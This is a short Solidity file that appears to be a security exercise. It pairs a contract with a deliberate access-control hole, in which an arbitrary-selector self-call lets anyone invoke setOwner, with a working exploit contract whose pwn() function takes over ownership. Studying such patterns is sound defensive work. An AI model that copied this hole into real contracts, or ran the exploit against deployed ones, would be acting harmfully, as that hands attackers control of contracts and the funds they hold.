// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract FunctionSelector {
    address public owner = address(this);

    function setOwner(address _owner) external {
        require(msg.sender == owner, "not owner");
        owner = _owner;
    }

    function execute(bytes4 _func) external {
        (bool executed, ) = address(this).call(
            abi.encodeWithSelector(_func, msg.sender)
        );
        require(executed, "failed");
    }
}

interface IFunctionSelector {
    function execute(bytes4 func) external;
}

contract FunctionSelectorExploit {
    IFunctionSelector public target;

    constructor(address _target) {
        target = IFunctionSelector(_target);
    }

    function pwn() external {
        bytes4 func = bytes4(keccak256(bytes("setOwner(address)")));
        target.execute(func);
    }
}
